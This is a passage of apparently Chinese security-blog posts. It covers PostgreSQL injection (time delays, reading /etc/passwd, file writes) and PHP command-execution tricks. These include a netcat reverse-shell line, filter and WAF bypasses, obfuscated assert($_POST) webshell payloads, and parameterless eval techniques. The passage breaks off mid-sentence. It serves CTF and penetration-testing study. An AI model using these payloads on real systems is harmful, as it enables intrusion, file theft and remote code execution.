子句是只能用于对字符进行比较，因此在上面例子中，我们要将整型数据类型转化为字符串数据类型。\n\n根据活动的语言环境，可以使用关键字`ILIKE`代替`LIKE`来使匹配不区分大小写。这不是 SQL 标准，而是 PostgreSQL 扩展。\n\n如果匹配的字符串中包含特殊字符，使用`escape ''`来选择转义任何字符\n\n```sql\nspostgres=# select 'aaa%bbb' like 'aaa%';\n ?column?\n----------\n t\n(1 row)\n\npostgres=# select 'aaa%bbb' like 'aaa1%' escape '1';\n ?column?\n----------\n f\n(1 row)\n\npostgres=# select 'aaa%bbb' like 'aaa1%%' escape '1';\n ?column?\n----------\n t\n(1 row)\n\npostgres=# select 'aaa%bbb' like 'aaa1%bb' escape '1';\n ?column?\n----------\n f\n(1 row)\n\npostgres=# select 'aaa%bbb' like 'aaa1%bb_' escape '1';\n ?column?\n----------\n t\n(1 row)\n\n--可以看到使用escape之后，将1当作转义符\n```\n\n如果`like`被过滤，可以使用`~~`\n\n```\npostgres=# select '123' ~~ '1%';\n ?column?\n----------\n t\n(1 row)\n```\n\n运算符`~~`等效于`LIKE`，而`~~*`对应于`ILIKE`。还有`!~~`和`!~~*`运算符分别代表`NOT LIKE`和`NOT ILIKE`。所有这些运算符都是特定于 PostgreSQL 的。您可能会在`EXPLAIN`输出和类似的位置看到这些运算符名称，因为解析器实际上翻译了`LIKE`等。这些运算符。\n\n**类似还有****SIMILAR TO**\n\n`SIMILAR TO`运算符根据其模式是否与给定的字符串匹配而返回 true 或 false。它类似于`LIKE`，除了它使用 SQL 标准的正则表达式定义来解释模式。 SQL 正则表达式是`LIKE`表示法和通用正则表达式表示法之间的一个奇怪的交叉。\n\n像`LIKE`一样，`SIMILAR TO`运算符仅在其模式与整个字符串匹配时才成功；这与常见的正则表达式行为不同，在常规行为中，模式可以匹配字符串的任何部分。与`LIKE`一样，`SIMILAR TO`使用`_`和`%`作为通配符，分别表示任何单个字符和任何字符串(在 POSIX 正则表达式中，它们分别与`.`和`.*`相类似)。\n\n除了从`LIKE`借用的这些功能之外，`SIMILAR TO`还支持从 POSIX 正则表达式借用的这些模式匹配元字符：\n\n- `|`表示交替(两种选择之一)。\n- `*`表示重复上一个项目零次或多次。\n- `+`表示重复前一个项目一次或多次。\n- `?`表示重复上一个项目零或一次。\n- `{` *m* `MARKDOWN_HASHcbb184dd8e05c9709e5dcaedaa0495cfMARKDOWN`*HASH**表示前一项正好重复*`m` *次。\n- `{` *m* `,}`表示重复上一项 *m* 或更多次。\n- `{` *m* `,` *n* `}`表示前一项重复至少 *m* 但不超过 *n* 次。\n- 括号`()`可用于将项目分组为单个逻辑项目。\n- 与 POSIX 正则表达式一样，方括号表达式`[...]`指定字符类。\n\n请注意，句点(`.`)不是`SIMILAR TO`的元字符。\n\n与`LIKE`一样，反斜杠会禁用任何这些元字符的特殊含义；或可以使用`ESCAPE`指定其他转义字符。\n\nSome examples:\n\n```sql\n'abc' SIMILAR TO 'abc'      true\n'abc' SIMILAR TO 'a'        false\n'abc' SIMILAR TO '%(b|d)%'  true\n'abc' SIMILAR TO '(b|c)%'   false\n```\n\n## 聚合函数\n\n`plsql`中并没有`group_concat()`这个函数，用聚合函数`array_agg()、string_agg()`\n\n```sql\n--array_agg(expression) 把表达式变成一个数组\npostgres=# select array_agg(name) from company;\n array_agg\n-----------\n {Paul,cc}\n(1 row)\n\n--通常搭配array_to_string()使用\n\npostgres=# select array_to_string(array_agg(name),',') from company;\n array_to_string\n-----------------\n Paul,cc\n(1 row)\n```\n\n```sql\n--string_agg(expression, delimiter) 直接把一个表达式变成字符串\npostgres=# select string_agg(name,',')  from company;\n string_agg\n------------\n Paul,cc\n(1 row)\n```\n\n## 延时函数\n\n`pg_sleep(5)`\n\n**注意：**\n\n```sql\n--与mysql中的sleep()有所不同\n--当将pg_sleep()与布尔一起使用时会报错，因为pg_sleep返回值为空。\npostgres=# select '1' = pg_sleep(1);\nERROR:  argument of AND must be type boolean, not type void\nLINE 1: select '1' and pg_sleep(1);\n```\n\n这里提供几种解决的办法\n\n```sql\n方法1：\nselect xxx from pg_sleep(); --可以延时，并且返回xxx\n\npostgres=# select 1 from pg_sleep(1);\n ?column?\n----------\n        1\n(1 row)\n--通过这个就有返回值，可以比较了\npostgres=# select '1'=(select '1' from pg_sleep(1));\n ?column?\n----------\n t\n(1 row)\n\n--可以看出plsql的数据类型比较严格，不会随意进行转换\n\n方法2：\n--通过类型转换，将数据转化为字符\npostgres=# select '1'=pg_sleep(1)::varchar;\n ?column?\n----------\n f\n(1 row)\n\nselect * from company where id = 1 and 'a'=(case when (1=1) then pg_sleep(5)::VARCHAR else 'a' end);\n\n方法3：\n--通过||\n--与mysql不一样，在plsql中，||是拼接字符串的意思\n\npostgres=# select '1'||'asss';\n ?column?\n----------\n 1asss\n(1 row)\nselect * from company where id = 1 and 'a'=(case when (1=1) then pg_sleep(5)||'b' else 'a' end);\n```\n\n## 文件操作\n\n`pg_ls_dir()`：列出目录的内容。 默认限制为超级用户，但可以授予其他用户 EXECUTE 来运行该功能。\n\n`pg_read_file()`：列出目录的内容。 默认限制为超级用户，但可以授予其他用户 EXECUTE 来运行该功能。\n\n```sql\npostgres=# select pg_ls_dir('/');\n pg_ls_dir\n------------\n home\n srv\n etc\n opt\n root\n lib\n mnt\n usr\n media\n lib64\n sys\n dev\n sbin\n boot\n bin\n run\n lib32\n libx32\n init\n proc\n snap\n tmp\n var\n lost+found\n(24 rows)\n\npostgres=# select pg_ls_dir('/');\n                                       pg_read_file\n-------------------------------------------------------------------------------------------\n root:x:0:0:root:/root:/bin/bash                                                          +\n daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                          +\n bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                     +\n sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                     +\n sync:x:4:65534:sync:/bin:/bin/sync                                                       +\n games:x:5:60:games:/usr/games:/usr/sbin/nologin                                          +\n man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                          +\n lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                                             +\n mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                                              +\n news:x:9:9:news:/var/spool/news:/usr/sbin/nologin                                        +\n uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin                                      +\n proxy:x:13:13:proxy:/bin:/usr/sbin/nologin                                               +\n www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin                                     +\n backup:x:34:34:backup:/var/backups:/usr/sbin/nologin                                     +\n list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin                            +\n irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin                                         +\n gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin        +\n nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin                               +\n systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin   +\n systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin             +\n systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin+\n messagebus:x:103:106::/nonexistent:/usr/sbin/nologin                                     +\n syslog:x:104:110::/home/syslog:/usr/sbin/nologin                                         +\n _apt:x:105:65534::/nonexistent:/usr/sbin/nologin                                         +\n tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false                              +\n uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin                                            +\n tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin                                        +\n```\n\n**堆叠注入时**\n\n```sql\nCREATE TABLE Y1ng(t TEXT);\nCOPY Y1ng FROM '/etc/passwd';\nSELECT * FROM Y1ng limit 1 offset 0;  --通过偏移量读取某一行\nSELECT * FROM Y1ng limit 1 offset 1;\nSELECT * FROM Y1ng limit 1 offset 2;\nSELECT * FROM Y1ng limit 1 offset 3;\nSELECT * FROM Y1ng limit 1 offset 4;\nSELECT * FROM Y1ng limit 1 offset 5;\n--直接读取文件的全部内容：\nCREATE TABLE Y1ng(t TEXT);\nCOPY Y1ng(t) FROM '/etc/passwd';\nSELECT * FROM Y1ng;\n```\n\n**文件写入**\n\n```sql\nDROP TABLE Y1ng;\nCREATE TABLE Y1ng (t TEXT);\nINSERT INTO Y1ng(t) VALUES ('hello Y1ng');\nCOPY Y1ng(t) TO '/tmp/Y1ng';\n```\n\n## 系统数据库\n\n在plsql中也存在库`information_schema`\n\n```plsql\n--查表名\nselect table_name from information_schema.tables where table_name not like 'pg%' and table_schema='public';\nselect table_name from information_schema.tables where table_name not like 'pg%';\nselect string_agg(tablename, ',') from pg_tables where schemaname='public';\n--查列名\nselect column_name from information_schema.columns where table_name like 'company';\nselect string_agg(column_name, ',') from information_schema.columns where table_schema='public'\n(老版本)\npg_class.oid对应pg_attribute.attrelid\npg_class.relname表名\npg_attribute.attname字段名\n\nselect relname from pg_class获取表名\nselect oid from pg_class wehre relname='admin'获取表的oid\nselect attname from pg_attribute where attrelid='oid的值'  获取字段名\n```\n\n## plsql常用命令\n\n```plsql\nselect CURRENT_SCHEMA()           #查看当前权限\nselect user                       #查看用户\nselect current_user               #查看当前用户\nselect chr(97)                    #将ASCII码转为字符\nselect chr(97)||chr(100)||chr(109)||chr(105)||chr(110)  #将ASCII转换为字符串\nSELECT session_user;\nSELECT usename FROM pg_user;\nSELECT getpgusername();\nselect version()                  #查看PostgreSQL数据库版本\nSELECT current_database()         #查看当前数据库\nselect length('admin')            #查看长度\n```\n\n[知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)\n\n[Mysql注入](https://ccship.cn/tag/mysql%e6%b3%a8%e5%85%a5/) [PostgreSQL注入](https://ccship.cn/tag/postgresql%e6%b3%a8%e5%85%a5/) [Sqlite注入](https://ccship.cn/tag/sqlite%e6%b3%a8%e5%85%a5/)\n\n0\n\n[Previous Post](https://ccship.cn/2021/10/21/ysoserial%e4%bd%bf%e7%94%a8%e6%96%b9%e6%b3%95/)\n\n### [ysoserial使用方法](https://ccship.cn/2021/10/21/ysoserial%e4%bd%bf%e7%94%a8%e6%96%b9%e6%b3%95/)\n\n------\n\n[Next Post](https://ccship.cn/2021/10/21/java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8bcommons-collections1%e9%93%be/)\n\n### [Java反序列化之Commons-Collectio](https://ccship.cn/2021/10/21/java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8bcommons-collections1%e9%93%be/)","tags":["web安全","基础漏洞"]},{"title":"命令执行漏洞总结","url":"/2023/08/05/命令执行漏洞总结/","content":"\n\n\n<meta name=\"referrer\" content=\"no-referrer\"/> \n\n# 命令执行漏洞（RCE）\n\n\n\n## 相关函数\n\nphp 常见的调用外部程序的函数\n\n系统命令执行\n\n1. system(args)--有回显\n2. shell_exec(args)--无回显必须输出\n3. passthru()\n4. popen(handle,mode)--无回显\n5. exec(args)--回显最后一行，必须加echo输出\n6. **proc_open()**\n7. **`(反单引号)**\n\n在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数 shell_exec() 相同。\n\nphp代码执行\n\n1. assert()a\n2. preg_replace ( $pattern ,$replacement ,  $subject [,  $limit = -1 [, &$count ]] )\n\n搜索subject中匹配pattern的部分， 以replacement进行替换。当使用被弃用的 e 修饰符时, 这个函数会转义一些字符，在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串\n\n1. eval()\n2. call_user_func (  $callback [, $parameter [, $... ]] )\n\n第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。 传入call_user_func()的参数不能为引用传递。\n\n1. **call_user_func_array($****callback****,$param_arr)**\n\n把第一个参数作为**回调函数****（****callback****）**调用，把参数数组作（param_arr）为回调函数的的参数传入string \n\n1. create_function ( $args , $code )\n\n该函数的内部实现用到了`eval`。第一个参数`args`是后面定义函数的参数，第二个参数是函数的代码。\n\n1. array_map ( callable $callback ,  $array1 [,  $... ] )\n\n作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。\n\n示例\n\n```php\n<?php\n        $a = $_GET['chybeta'];\n        $b = create_function('$a',\"echo $a\");\n        $b('');\n?>\nhttp://localhost:2500/codeexec.php?chybeta=phpinfo();\n<?php\n        $array = array(0,1,2,3,4,5);\n        array_map($_GET['chybeta'],$array);\n?>\nhttp://localhost:2500/codeexec.php?chybeta=phpinfo\n```\n\n### 利用\n\n**（1）管道操作**\n\n将一端的命令输出交给另一端的命令处理。格式：    命令1  |  命令2    \n\n如：ps aux | grep httpd\n\n**（2）重定向**\n\n改变执行命令时的默认输入输出\n\n类型操作符用途\n\n重定向输入                      <                                  从指定文件读取数据而不是从键盘读取\n\n重定向输出                     >   或>>                      将输出结果覆盖、追加到指定文件（>覆盖、>>追加）\n\n重定向标准错误输出     2>或 2>>                 将错误信息覆盖或追加到指定文件\n\n重定向混合输出             &> 或 &>>               将标准输出和错误信息覆盖或追加到指定文件\n\n**（3)逻辑分割**\n\n处理多条命令之间的逻辑关系\n\n逻辑与                      &&      两条命令都要执行\n\n逻辑或                     ||           若第一条命令执行成功，则不执行第二条命令（即只要有一条命令成功就不再继续执行命令）\n\n顺序执行               ;              执行完第一条命令后执行第二条命令\n\n作用\n\n1. 读取敏感文件   /etc/passwd\n2. NC反弹shell\n\nnc -e /bin/bash 127.0.0.1 3737\n\n## Bash\n\nBash 是GNU操作系统的 shell 或命令语言解释器\n\n## **WAF****绕过**\n\n### 常见的替换\n\n空格\n\n> \\>     <       <>\n\nshell下特殊符号\n\n$(base64编码内容|d -base64)\n\n### **通配符**\n\n在bash的操作环境中有一个非常有用的功能，那就是通配符，下面列出一些常用的通配符：\n\n```\n*    代表『 0 个到无穷多个』任意字符\n?    代表『一定有一个』任意字符\n[ ]    同样代表『一定有一个在括号内』的字符(非任意字符)。例如 [abcd] 代表『一定有一个字符， 可能是 a, b, c, d 这四个任何一个』\n[ - ]    若有减号在中括号内时，代表『在编码顺序内的所有字符』。例如 [0-9] 代表 0 到 9 之间的所有数字，因为数字的语系编码是连续的！\n[^ ]    若中括号内的第一个字符为指数符号 (^) ，那表示『反向选择』，例如 [^abc] 代表 一定有一个字符，只要是非 a, b, c 的其他字符就接受的意思。\n```\n\n### **连接符**\n\n引号连接，注意要闭合好\n\n单引号\n\n/'b'i'n'/'c'a't' /'e't'c'/'p'a's's'w'd\n\n双引号\n\n/\"b\"i\"n\"/\"w\"h\"i\"c\"h\" \"n\"c\n\n反斜杆\n\n/b\\i\\n/w\\h\\i\\c\\h n\\c\n\n### 正则表达式绕过\n\n#### **空格绕过**\n\n- `<` 符号 `cat<123`\n- `\\t` / `%09`\n- `${IFS}` 其中{}用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串\n\n#### **黑名单绕过**\n\n- `a=l;b=s;$a$b`\n- base64 `echo \"bHM=\" | base64 -d`\n- `/?in/?s` => `/bin/ls`\n- 连接符 `cat /etc/pass'w'd`\n- 未定义的初始化变量 `cat$x /etc/passwd`\n\n## 无字母(数字)RCE\n\n推荐p神的文章--https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html\n\n利用各种非数字字母的字符，经过各种变换（异或、取反、自增），构造出单个的字母字符，然后把单个字符拼接成一个函数名，比如说`assert`，然后就可以动态执行了。所以说这里的核心就是要将非字母的字符变换成字母字符。\n\n### 1.异或 ^\n\n指的是php按位异或，在php中，两个字符进行异或操作后，得到的依然是**一个字符**，当我们想得到`a-z`中某个字母时，就可以找到两个非字母数字的字符，只要他们俩的异或结果是这个字母即可。而在php中，两个字符进行异或时，会先将字符串转换成`ascii码`值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：`1^1=0,1^0=1,0^1=1,0^0=0`，简单的来说就是**相同为零，不同为一**\n\n因为很多都是不可见的字符，所以说我就先url编码了一下\n\n```php\na:'%40'^'%21' ; s:'%7B'^'%08' ; s:'%7B'^'%08' ; e:'%7B'^'%1E' ; r:'%7E'^'%0C' ; t:'%7C'^'%08'\nP:'%0D'^'%5D' ; O:'%0F'^'%40' ; S:'%0E'^'%5D' ; T:'%0B'^'%5F'\n拼接起来：\n$_=('%40'^'%21').('%7B'^'%08').('%7B'^'%08').('%7B'^'%1E').('%7E'^'%0C').('%7C'^'%08'); //$_=assert\n$__='_'.('%0D'^'%5D').('%0F'^'%40').('%0E'^'%5D').('%0B'^'%5F');  //$__=_POST$___=$$__; $___=$_POST$_($___[_]);//assert($_POST[_]);放到一排就是：\n$_=('%40'^'%21').('%7B'^'%08').('%7B'^'%08').('%7B'^'%1E').('%7E'^'%0C').('%7C'^'%08');$__='_'.('%0D'^'%5D').('%0F'^'%40').('%0E'^'%5D').('%0B'^'%5F');$___=$$__;$_($___[_]);\n```\n\n### 2.取反 ~\n\n一个字符取反之后都会变成另一个字符，不像异或需要两个字符才能构造出一个字符。\n\n有参数函数要分开运算\n\n如\n\n```\nsystem('ls /');\n(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0); \n```\n\n利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如`'和'{2}`的结果是`\"\\x8c\"`，其取反即为字母`s`\n\n### 3.自增\n\n只要我们获得了小写字母`a`，就可以通过自增获得所有小写字母，当我们获得大写字母`A`，就可以获得所有大写字母了\n\n数组(Array)中就正好有大写字母`A`和小写字母`a`，而在PHP中，如果强制连接数组和字符串的话，数组就会被强制转换成字符串，它的值就为`Array`，那取它的第一个子母，就拿到`A`了，那有了`a`和`A`，相当于我们就可以拿到`a-z`和`A-Z`中的所有字母了\n\n```php\n<?php\n$_=[];\n$_=@\"$_\"; // $_='Array';\n$_=$_['!'=='@']; // $_=$_[0];\n$___=$_; // A\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___.=$__; // S\n$___.=$__; // S\n$__=$_;\n$__++;$__++;$__++;$__++; // E\n $___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;\n\n$____='_';\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;\n\n$_=$$____;\n$___($_[_]); // ASSERT($_POST[_]);\n```\n\n在php7中，我们可以使用($a)()这种方法来执行命令，如(call_user_func)(system,whoami,'')\n\nphp7特性\n\n```php\n<?php\n'var_dump'('1111');\n (\"VAR_DUMP\")(\"llll\");\n echo $_GET[ss];\necho $_GET['1'] . '<br/>';\necho $_GET[1];\n$a = '_GET';\necho $$a[1];\necho `pwd`;\n```\n\n![img](https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=NThjZjVhNjA3NWI1NmY1MjI1NzI2ZDcwZTE2NGQ4YTlfdnEydWQ0VDBWMFU4Z2dLMW1XVGhEUHhKZkQwV1M2VkNfVG9rZW46WmZiemJLdWZYb3lZZEp4cEVKbmNzZVhJbmViXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA)\n\n### 4.**临时文件**\n\n利用通配符\n\n用`. file`执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，\n\n这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是`/tmp/phpXXXXXX`，文件名最后6个字符是随机的大小写字母。\n\n所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。\n\n翻开ascii码表，可见大写字母位于`@`与`[`之间：\n\n当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。\n\n最后，我传入的code为`?><?=. /???/????????[@-[];?>`，发送数据包如下：\n\n![img](https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YWU5MjU2NWQ2MWJmYjU3Zjk5MGY3MTY2Y2Q4YmZiYzZfUENkN3pEbm5MMzU2b0hQWk9NVDhENnlHVlo0R3J3alRfVG9rZW46RUYzd2JmRWt6b2JkRXl4NkFlRGNVQ0tpbmxiXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA)\n\n成功执行任意命令。\n\n## 无参数RCE\n\n无参rce，就是说在无法传入参数的情况下，仅仅依靠传入没有参数的函数套娃就可以达到命令执行的效果，这在ctf中也算是一个比较常见的考点，接下来就来详细总结总结它的利用姿势\n\n## 核心代码\n\n```php\nif(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) { \n eval($_GET['code']);\n}\n```\n\n这段代码的核心就是只允许函数而不允许函数中的参数，就是说传进去的值是一个字符串接一个`()`，那么这个字符串就会被替换为空，如果替换后只剩下`;`，那么这段代码就会被`eval`执行。而且因为这个正则表达式是递归调用的，所以说像`a(b(c()));`第一次匹配后就还剩下`a(b());`，第二次匹配后就还剩`a();`，第三次匹配后就还剩`;`了，所以说这一串`a(b(c()));`就会被`eval`执行，但相反，像`a(b('111'));`这种存在参数的就不行，因为无论正则匹配多少次它的参数总是存在的。那假如遇到这种情况，我们就只能使用没有参数的php函数，下面就来具体介绍一下：\n\n## 1.getallheaders()\n\n这个函数的作用是获取`http`所有的头部信息，也就是`headers`，然后我们可以用`var_dump`把它打印出来，但这个有个限制条件就是必须在`apache`的环境下可以使用，其它环境都是用不了的，我们到burp中去做演示,测试代码如下：\n\n```php\n<?php\nhighlight_file(__FILE__);\nif(isset($_GET['code'])){\nif(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) { \n eval($_GET['code']);}\nelse\n die('nonono');}\nelse\n echo('please input code');\n?> \n```\n\n![img](https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=M2Y2OTE1NzVjMzBkZGZiZGY1MzZmODY0ODk4OWNjMWFfOXQ1SnRDZ1NqTVJSaWZvOEJMZDNDYmxJSlV0SFlHNTFfVG9rZW46QkpCYmJReDR4bzZVMUd4ZDBtTmNFTEMxbkZnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA)\n\nimage.png\n\n可以看到，所有的头部信息都已经作为了一个**数组**打印了出来，在实际的运用中，我们肯定不需要这么多条，不然它到底执行哪一条呢？所以我们需要选择一条出来然后就执行它，这里就需要用到`php`中操纵数组的函数了，这里常见的是利用`end()`函数取出最后一位，这里的效果如下图所示，而且它只会以**字符串**的形式取出**值**而不会取出键，所以说键名随便取就行：\n\n![img](https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YjcwZmViOTQ5NjZlYzZkZDdlMjMyNjIyOGQ2M2VjODhfNmFYY2VGZU1oRXFNZXVYMXh2dVRxWGlWQXVybTR1dGxfVG9rZW46VkJOQ2I1UmVPb0o1QU54cE9xV2NUcjB5bjFiXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA)\n\nimage.png\n\n那我们把最前面的`var_dump`改成`eval`，不就可以执行`phpinfo`了吗，换言之，就可以实现任意php代码的代码执行了，那在没有过滤的情况下执行命令也就轻而易举了，具体效果如下图所示：\n\n![img](https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MmY0Yzk0MjA1MWU0MDlhNWMyODAwMTBkZDIyMzEyZTZfTHU0emMxbVBkQXJjMGo4WVhGWVoxOVQ0MDRMZmpKbVpfVG9rZW46RnBjTGJhYkM5bzZkU2p4NndQcWNOOHpmbmFnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA)\n\nimage.png\n\n![img](https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ODYyMDRkNmUzOWFjYjMzYzdkOTlmNDJiNWZmZGI1MmNfcjdPTTJNaGRQUnMzQVk5dGF5QlVpN2ZHM1lYN2NlcjJfVG9rZW46RE1XRGJ6N1lFb3Bycnd4OUJtQmNpSFhybmtZXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA)\n\nimage.png\n\n## 2.get_defined_vars()\n\n上面说到了，`getallheaders()`是有局限性的，因为如果中间件不是`apache`的话，它就用不了了，那我们就介绍一种更为普遍的方法`get_defined_vars()`，这种方法其实和上面那种方法原理是差不多的：\n\n![img](https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YTcyMjlhMDI4YmE1Y2FjNGJhZjlmODNmZTNiZGJhZmZfaFhtY2FKVGx6TzBqVldjc3JMMzFpN3dYdkRsUWhrYW1fVG9rZW46T2ViS2JJVTUyb2l6THl4Vk81WGNpVkFBbnhmXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA)\n\nimage.png\n\n可以看到，它并不是获取的`headers`，而是获取的四个全局变量`$_GET $_POST $_FILES $_COOKIE`，而它的返回值是一个二维数组，我们利用`GET`方式传入的参数在第一个数组中。这里我们就需要先将二维数组转换为一维数组，这里我们用到`current()`函数，这个函数的作用是返回数组中的当前单元，而它的默认是第一个单元，也就是我们GET方式传入的参数，我们可以看看实际效果：\n\n![img](https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDE3NmU2OTdkM2Y4ODVlMDYwZDFlOTk0YTc3NmRmNzlfUEJkRDBXM1VEdWxpNnhyaHVPMnlZN01xQVlad2ZZVTFfVG9rZW46SldnZ2JWcm1Qb0YzYjl4d3ZHMWNQSlZWbjNlXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA)\n\nimage.png\n\n这里可以看到成功输出了我们二维数组中的第一个数据，也就是将GET的数据全部输出了出来，相当于它就已经变成了一个一维数组了，那按照我们上面的方法，我们就可以利用`end()`函数以字符串的形式取出最后的值，然后直接`eval`执行就行了，这里和上面就是一样的了：\n\n![img](https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=NTE2NmNjMmNkMDJmODQ5ODZmN2RmYzQyMzczYzFlMDJfM0xMWHg3OE5xVnVLVmVzc0hNOTNTRlB0WWh4R1UyUDVfVG9rZW46SU11QWJUNnNKbzNiMGV4c1djMWN5bGdUbmJkXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA)\n\nimage.png\n\n![img](https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YmM0Yzc3YWEzYTJlOTZlYjE0ZDAwMmFiMTk5ZjFjMjVfNk5pVnRYRzlpTjFvQWFJVG1vY3l2TUxKY0UyQ1hMdUdfVG9rZW46QnhKdWJQM3pxbzZpYWZ4amxSRWNpOEMwbk9oXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA)\n\nimage.png\n\n![img](https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=N2Q3MWE2ZDBhYWQ0YTY1NGY2OWIyMGFiYWM5Nzk5MTZfaFFMRmw1NGZBVVNoVzBqcFk3ZkREVXdzWHY1TFQ1dnFfVG9rZW46VTNUTmJtMm1wb1FlVjF4dGw0cWNQNWx3bndoXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA)\n\nimage.png\n\n总结一下，这种方法和第一种方法几乎是一样的，就多了一步，就是利用`current()`函数将二维数组转换为一维数组，如果大家还是不了解`current()`函数的用法，可以接着往下看文章，会具体介绍的哦\n\n这里还有一个专门针对`$_FILES`下手的方法，可以参考这篇文章：<https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/>\n\n## 3.session_id()\n\n这种方法和前面的也差不太多，这种方法简单来说就是把恶意代码写到`COOKIE`的`PHPSESSID`中，然后利用`session_id()`这个函数去读取它，返回一个字符串，然后我们就可以用`eval`去直接执行了，这里有一点要注意的就是`session_id()`要开启`session`才能用，所以说要先`session_start()`，这里我们先试着把`PHPSESSID`的值取出来：\n\n![img](https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjZhNmMwNTczNTBjYzg1MzYwZmJiMWE4MjJiZWNjNjVfY3dMU2RKR241cFhIZnJpTFZ1YTBQdWdCTmNRcnFVZVdfVG9rZW46UzV5aWJHekdzb21GYkx4RW1qc2MybTBDbkN1XzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA)\n\nimage.png\n\n直接出来就是字符串，那就非常完美，我们就不用去做任何的转换了，但这里要注意的是，`PHPSESSIID`中只能有`A-Z a-z 